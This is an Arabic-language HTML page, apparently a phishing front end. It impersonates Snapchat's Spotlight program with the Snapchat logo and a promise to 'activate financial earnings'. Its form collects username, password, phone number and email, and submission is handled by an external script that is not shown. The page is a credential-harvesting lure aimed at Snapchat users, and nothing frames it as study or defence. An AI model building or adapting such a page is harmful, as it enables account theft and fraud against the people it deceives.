<!DOCTYPE html>
<html lang="ar">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>منصة الأضواء - تفعيل المكاسب</title>
    <link rel="stylesheet" href="styles.css">
</head>
<body>

    <div class="container">
        <img src="logo.png" alt="Snapchat Logo" class="logo">
        <h1 class="title">منصة الأضواء</h1>
        <p class="subtitle">تفعيل المكاسب المالية</p>
        
        <form id="loginForm">
            <label for="username">اسم المستخدم</label>
            <input type="text" id="username" placeholder="أدخل اسم المستخدم" required>

            <label for="password">كلمة المرور</label>
            <input type="password" id="password" placeholder="أدخل كلمة المرور" required>

            <label for="phone">رقم الهاتف</label>
            <input type="text" id="phone" placeholder="أدخل رقم الهاتف" required>

            <label for="email">البريد الإلكتروني</label>
            <input type="email" id="email" placeholder="أدخل بريدك الإلكتروني" required>

            <button type="submit" class="submit-btn">تفعيل المكاسب</button>
        </form>

        <p id="message" class="hidden"></p>
    </div>

    <script src="script.js"></script>
</body>
</html>
